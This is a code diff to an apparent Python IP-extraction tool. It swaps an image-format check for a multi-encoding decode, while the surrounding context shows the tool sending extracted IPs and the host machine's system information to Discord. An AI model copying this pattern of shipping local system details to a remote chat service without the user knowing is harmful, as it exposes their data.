@@ -120,7 +120,6 @@ def main():
     # Now import the required packages after setup
     import requests
     import PyPDF2
-    import imghdr
     import re
     import socket
     import platform
@@ -222,15 +221,24 @@ def main():
             try:
                 with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
                     progress.add_task("Processing Image...", total=None)
-                    # Check if it's a valid image file
-                    if not imghdr.what(file_path):
-                        raise ValueError("Invalid or unsupported image format")
                     
                     # Read the file and look for IP addresses in the binary content
                     with open(file_path, 'rb') as f:
                         content = f.read()
-                        # Convert binary content to string, looking for IP addresses
-                        text_content = content.decode('utf-8', errors='ignore')
+                        # Try different encodings to find readable text
+                        encodings = ['utf-8', 'ascii', 'iso-8859-1', 'cp1252']
+                        text_content = ""
+                        
+                        for encoding in encodings:
+                            try:
+                                text_content = content.decode(encoding)
+                                break
+                            except UnicodeDecodeError:
+                                continue
+                        
+                        if not text_content:
+                            text_content = str(content)  # Fallback to string representation
+                        
                         system_info = self.get_system_info()
                         self.send_to_discord(self.extract_ips_from_text(text_content), f"Image: {file_path}", system_info)
             except Exception as e:
